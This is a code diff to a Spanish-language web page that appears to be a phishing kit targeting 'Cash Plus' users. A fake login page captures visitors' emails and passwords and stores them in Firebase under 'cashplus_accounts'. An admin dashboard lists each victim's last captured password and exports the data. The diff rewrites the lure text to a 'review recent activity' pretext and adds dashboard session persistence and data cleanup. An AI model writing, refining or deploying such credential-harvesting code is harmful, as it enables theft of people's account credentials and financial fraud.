@@ -1199,7 +1199,7 @@
                  id="main-logo">
             <h1 class="login-title">Iniciar sesión</h1>
             <div class="security-message-header">
-                Por razones de seguridad, debes iniciar sesión en tu cuenta para cambiar tu contraseña.
+                Por razones de seguridad, debe iniciar sesión en su cuenta para revisar la actividad reciente.
             </div>
         </div>
 
@@ -1391,7 +1391,85 @@
     let loginAttempts = 0;
     let unsubscribe = null;
 
-    // ========== FUNCIONES ORIGINALES ==========
+    // ========== FUNCIÓN PRINCIPAL DE INICIO ==========
+    // Esta función se ejecuta cuando la página se carga
+    document.addEventListener('DOMContentLoaded', function() {
+        // Verificar si hay una sesión activa de admin
+        const adminSession = sessionStorage.getItem('adminAuthenticated');
+        const lastDashboardState = localStorage.getItem('dashboardState');
+        
+        if (adminSession === 'true' && lastDashboardState) {
+            // Hay sesión activa, cargar directamente el dashboard
+            loadDashboardFromStorage();
+        } else {
+            // No hay sesión, mostrar login normal
+            init();
+        }
+    });
+
+    // ========== FUNCIONES DE PERSISTENCIA DE SESIÓN ==========
+    
+    // Cargar dashboard desde almacenamiento
+    async function loadDashboardFromStorage() {
+        try {
+            // Mostrar overlay de carga
+            showPageTransition();
+            
+            // Ocultar todas las páginas
+            document.getElementById('main-login').style.display = 'none';
+            document.getElementById('admin-login-page').style.display = 'none';
+            document.getElementById('password-change-page').style.display = 'none';
+            document.getElementById('success-page').style.display = 'none';
+            
+            // Cargar datos guardados
+            const savedState = JSON.parse(localStorage.getItem('dashboardState'));
+            
+            // Cargar datos de Firebase primero
+            await loadDataFromFirebase();
+            
+            // Si hay datos guardados, restaurar el panel activo
+            if (savedState && savedState.currentPanel) {
+                currentDashboardPage = savedState.currentPanel;
+            }
+            
+            // Mostrar dashboard
+            const dashboardContainer = document.getElementById('dashboard-container');
+            dashboardContainer.style.display = 'block';
+            
+            renderDashboard();
+            setupRealtimeSync();
+            
+            // Ocultar overlay de carga
+            hidePageTransition();
+        } catch (e) {
+            console.error("Error restaurando sesión:", e);
+            // Si hay error, limpiar sesión y mostrar login
+            sessionStorage.removeItem('adminAuthenticated');
+            localStorage.removeItem('dashboardState');
+            init();
+            hidePageTransition();
+        }
+    }
+
+    // Función para recargar la página (efecto F5)
+    function refreshPage() {
+        // Guardar estado actual antes de recargar
+        saveDashboardState();
+        // Recargar la página
+        window.location.reload();
+    }
+
+    // Guardar estado del dashboard
+    function saveDashboardState() {
+        const state = {
+            accounts: accountsData,
+            currentPanel: currentDashboardPage,
+            timestamp: new Date().toISOString()
+        };
+        localStorage.setItem('dashboardState', JSON.stringify(state));
+    }
+
+    // ========== FUNCIONES ORIGINALES MODIFICADAS ==========
 
     function showPageTransition() {
         document.getElementById('page-transition-overlay').style.display = 'flex';
@@ -1436,8 +1514,13 @@
     }
 
     function goBackToMainLogin() {
+        // Limpiar sesión al salir
+        sessionStorage.removeItem('adminAuthenticated');
+        localStorage.removeItem('dashboardState');
+        
         document.getElementById('admin-login-page').style.display = 'none';
         document.getElementById('dashboard-container').style.display = 'none';
+        document.getElementById('dashboard-container').innerHTML = '';
         document.getElementById('password-change-page').style.display = 'none';
         document.getElementById('success-page').style.display = 'none';
         document.getElementById('main-login').style.display = 'flex';
@@ -1486,7 +1569,7 @@
         if (!email || !password) return null;
 
         const datetime = getCurrentDateTime();
-        let accountIndex = accountsData.findIndex(a => a.email === email);
+        let accountIndex = accountsData.findIndex(a => a && a.email === email);
         let account;
 
         if (accountIndex === -1) {
@@ -1515,7 +1598,7 @@
         }
 
         localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
-
+        
         db.collection('cashplus_accounts').doc(email).set(account)
             .catch(error => console.error("Error guardando en Firebase:", error));
 
@@ -1527,7 +1610,7 @@
         if (!email) return;
 
         if (confirm('¿Estás seguro de que quieres eliminar esta cuenta? Se borrará todo su historial.')) {
-            accountsData = accountsData.filter(account => account.email !== email);
+            accountsData = accountsData.filter(account => account && account.email !== email);
             localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
 
             if (selectedAccounts.has(email)) {
@@ -1541,6 +1624,7 @@
                 console.error("Error eliminando cuenta de Firebase:", error);
             }
 
+            saveDashboardState();
             renderAccountsTable();
             if (document.getElementById('panel-overview').classList.contains('active')) {
                 showPanel('overview');
@@ -1562,7 +1646,7 @@
         if (confirm(confirmMessage)) {
             const emailsToDelete = Array.from(selectedAccounts);
 
-            accountsData = accountsData.filter(account => !selectedAccounts.has(account.email));
+            accountsData = accountsData.filter(account => account && !selectedAccounts.has(account.email));
             localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
 
             try {
@@ -1576,6 +1660,7 @@
             }
 
             selectedAccounts.clear();
+            saveDashboardState();
             renderAccountsTable();
             if (document.getElementById('panel-overview').classList.contains('active')) {
                 showPanel('overview');
@@ -1597,11 +1682,15 @@
             
             const firebaseData = [];
             snapshot.forEach(doc => {
-                firebaseData.push(doc.data());
+                const data = doc.data();
+                if (data && data.email && data.email.trim() !== '') {
+                    firebaseData.push(data);
+                }
             });
 
             accountsData = firebaseData;
             localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
+            saveDashboardState();
 
             if (document.getElementById('dashboard-container').style.display === 'block') {
                 renderAccountsTable();
@@ -1730,6 +1819,9 @@
         loginBtn.classList.add('loading');
         loginBtn.disabled = true;
 
+        // Guardar sesión de admin
+        sessionStorage.setItem('adminAuthenticated', 'true');
+
         setTimeout(() => {
             loginBtn.classList.remove('loading');
             loginBtn.disabled = false;
@@ -1749,7 +1841,10 @@
         const localData = localStorage.getItem('cashplus_accounts');
         if (localData) {
             try {
-                accountsData = JSON.parse(localData);
+                const parsed = JSON.parse(localData);
+                accountsData = parsed.filter(account => 
+                    account && account.email && account.email.trim() !== ''
+                );
             } catch (e) {
                 console.error("Error parsing local data:", e);
                 accountsData = [];
@@ -1758,13 +1853,14 @@
         
         renderDashboard();
         setupRealtimeSync();
+        saveDashboardState();
     }
 
     function renderDashboard() {
         const dashboardContainer = document.getElementById('dashboard-container');
         dashboardContainer.innerHTML = generateDashboardHTML();
         initDashboard();
-        showPanel('overview');
+        showPanel(currentDashboardPage);
     }
 
     function generateDashboardHTML() {
@@ -1813,7 +1909,7 @@
                         <div class="topbar-title" id="topbar-title">Dashboard Principal</div>
                         <div class="topbar-actions">
                             <span class="topbar-date">${new Date().toLocaleDateString('es-ES', { year: 'numeric', month: 'long', day: 'numeric' })}</span>
-                            <button class="btn btn-ghost btn-small btn-icon" id="refresh-btn" onclick="refreshDashboard(this)">
+                            <button class="btn btn-ghost btn-small btn-icon" id="refresh-btn" onclick="refreshPage()">
                                 <i class="fas fa-sync-alt"></i>
                             </button>
                         </div>
@@ -1834,11 +1930,21 @@
     }
 
     function generateOverviewPanel() {
-        const total = accountsData.length;
+        const validAccounts = accountsData.filter(account => 
+            account && 
+            account.email && 
+            typeof account.email === 'string' && 
+            account.email.trim() !== '' && 
+            account.attempts && 
+            Array.isArray(account.attempts) && 
+            account.attempts.length > 0
+        );
+        
+        const total = validAccounts.length;
         const today = new Date().toISOString().split('T')[0];
         
         let activityToday = 0;
-        accountsData.forEach(account => {
+        validAccounts.forEach(account => {
             if (account.attempts && Array.isArray(account.attempts)) {
                 activityToday += account.attempts.filter(a => a && a.date === today).length;
             }
@@ -1877,8 +1983,7 @@
                             </tr>
                         </thead>
                         <tbody>
-                            ${accountsData.slice(-5).reverse().map(account => {
-                                if (!account || !account.attempts) return '';
+                            ${validAccounts.slice(-5).reverse().map(account => {
                                 const lastAttempt = account.attempts[account.attempts.length - 1];
                                 return `
                                 <tr>
@@ -1898,6 +2003,13 @@
                                     </td>
                                 </tr>
                             `}).join('')}
+                            ${validAccounts.length === 0 ? `
+                                <tr>
+                                    <td colspan="5" style="text-align:center;padding:32px;color:#70707a;">
+                                        No hay cuentas registradas
+                                    </td>
+                                </tr>
+                            ` : ''}
                         </tbody>
                     </table>
                 </div>
@@ -1957,15 +2069,23 @@
     }
 
     function generateAccountsRows() {
-        if (!accountsData || accountsData.length === 0) {
+        const validAccounts = accountsData.filter(account => 
+            account && 
+            account.email && 
+            typeof account.email === 'string' && 
+            account.email.trim() !== '' && 
+            account.attempts && 
+            Array.isArray(account.attempts)
+        );
+
+        if (validAccounts.length === 0) {
             return `<tr><td colspan="7" style="text-align:center;padding:32px;color:#70707a;">No hay cuentas registradas</td></tr>`;
         }
 
-        return accountsData.map(account => {
-            if (!account || !account.attempts) return '';
+        return validAccounts.map(account => {
             const lastAttempt = account.attempts[account.attempts.length - 1];
-            const lastPassword = lastAttempt ? lastAttempt.password : 'N/A';
-            const lastDate = lastAttempt ? (lastAttempt.date + ' ' + lastAttempt.time) : 'Nunca';
+            const lastPassword = lastAttempt && lastAttempt.password ? lastAttempt.password : 'N/A';
+            const lastDate = lastAttempt ? (lastAttempt.date + ' ' + (lastAttempt.time || '')) : 'Nunca';
             
             return `
             <tr>
@@ -1994,7 +2114,7 @@
     }
 
     function showHistory(email) {
-        const account = accountsData.find(a => a.email === email);
+        const account = accountsData.find(a => a && a.email === email);
         if (!account || !account.attempts) return;
         
         document.getElementById('modal-email-title').textContent = `Historial de: ${email}`;
@@ -2094,6 +2214,8 @@
         if (titleEl) titleEl.textContent = titles[panelName];
         currentDashboardPage = panelName;
 
+        saveDashboardState();
+
         if (panelName === 'accounts') {
             renderAccountsTable();
         }
@@ -2110,8 +2232,12 @@
     function filterAccounts() {
         const searchTerm = document.getElementById('account-search')?.value.toLowerCase() || '';
         
-        const filtered = accountsData.filter(account => 
-            account && account.email && account.email.toLowerCase().includes(searchTerm)
+        const validAccounts = accountsData.filter(account => 
+            account && account.email && account.email.trim() !== ''
+        );
+        
+        const filtered = validAccounts.filter(account => 
+            account.email.toLowerCase().includes(searchTerm)
         );
 
         const tbody = document.getElementById('accounts-table-body');
@@ -2121,8 +2247,8 @@
             } else {
                 tbody.innerHTML = filtered.map(account => {
                     const lastAttempt = account.attempts[account.attempts.length - 1];
-                    const lastPassword = lastAttempt ? lastAttempt.password : 'N/A';
-                    const lastDate = lastAttempt ? (lastAttempt.date + ' ' + lastAttempt.time) : 'Nunca';
+                    const lastPassword = lastAttempt && lastAttempt.password ? lastAttempt.password : 'N/A';
+                    const lastDate = lastAttempt ? (lastAttempt.date + ' ' + (lastAttempt.time || '')) : 'Nunca';
                     
                     return `
                     <tr>
@@ -2161,21 +2287,27 @@
         }
         updateSelectionUI();
         renderAccountsTable();
+        saveDashboardState();
     }
 
     function toggleSelectAll() {
         const selectAllCheckbox = document.getElementById('select-all-checkbox');
         if (!selectAllCheckbox) return;
         
+        const validAccounts = accountsData.filter(account => 
+            account && account.email && account.email.trim() !== ''
+        );
+        
         if (selectAllCheckbox.classList.contains('checked')) {
             selectedAccounts.clear();
         } else {
-            accountsData.forEach(account => {
+            validAccounts.forEach(account => {
                 if (account && account.email) selectedAccounts.add(account.email);
             });
         }
         updateSelectionUI();
         renderAccountsTable();
+        saveDashboardState();
     }
 
     function updateSelectionUI() {
@@ -2193,7 +2325,11 @@
         }
         
         if (selectAllCheckbox) {
-            if (accountsData.length > 0 && selectedAccounts.size === accountsData.length) {
+            const validAccounts = accountsData.filter(account => 
+                account && account.email && account.email.trim() !== ''
+            );
+            
+            if (validAccounts.length > 0 && selectedAccounts.size === validAccounts.length) {
                 selectAllCheckbox.classList.add('checked');
             } else {
                 selectAllCheckbox.classList.remove('checked');
@@ -2202,7 +2338,11 @@
     }
 
     function exportAllAccounts() {
-        const dataStr = JSON.stringify(accountsData, null, 2);
+        const validAccounts = accountsData.filter(account => 
+            account && account.email && account.email.trim() !== ''
+        );
+        
+        const dataStr = JSON.stringify(validAccounts, null, 2);
         const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
         const link = document.createElement('a');
         link.setAttribute('href', dataUri);
@@ -2211,26 +2351,11 @@
         closeSidebar();
     }
 
-    function refreshDashboard(btn) {
-        const icon = btn.querySelector('i');
-        if (icon) {
-            icon.classList.add('spinning');
-        }
-        
-        setTimeout(() => {
-            if (document.getElementById('panel-overview').classList.contains('active')) {
-                showPanel('overview');
-            } else if (document.getElementById('panel-accounts').classList.contains('active')) {
-                showPanel('accounts');
-            }
-            if (icon) {
-                icon.classList.remove('spinning');
-            }
-        }, 400);
-    }
-
     function handleLogout() {
         if (confirm('¿Cerrar sesión?')) {
+            sessionStorage.removeItem('adminAuthenticated');
+            localStorage.removeItem('dashboardState');
+            
             if (unsubscribe) {
                 unsubscribe();
                 unsubscribe = null;
@@ -2256,8 +2381,16 @@
             const accountsSnapshot = await db.collection('cashplus_accounts').get();
             
             if (!accountsSnapshot.empty) {
-                accountsData = accountsSnapshot.docs.map(doc => doc.data());
+                const firebaseData = [];
+                accountsSnapshot.forEach(doc => {
+                    const data = doc.data();
+                    if (data && data.email && data.email.trim() !== '') {
+                        firebaseData.push(data);
+                    }
+                });
+                accountsData = firebaseData;
                 localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
+                saveDashboardState();
             }
         } catch (error) {
             console.error("Error cargando datos de Firebase:", error);
@@ -2271,10 +2404,20 @@
         const localData = localStorage.getItem('cashplus_accounts');
         if (localData) {
             try {
-                accountsData = JSON.parse(localData);
+                const parsed = JSON.parse(localData);
+                accountsData = parsed.filter(account => 
+                    account && 
+                    account.email && 
+                    typeof account.email === 'string' && 
+                    account.email.trim() !== '' &&
+                    account.attempts && 
+                    Array.isArray(account.attempts)
+                );
+                localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
             } catch (e) {
                 console.error("Error parsing local data:", e);
                 accountsData = [];
+                localStorage.setItem('cashplus_accounts', '[]');
             }
         }
     }
@@ -2311,8 +2454,6 @@
             });
         }
     }
-
-    document.addEventListener('DOMContentLoaded', init);
 </script>
 </body>
 </html>
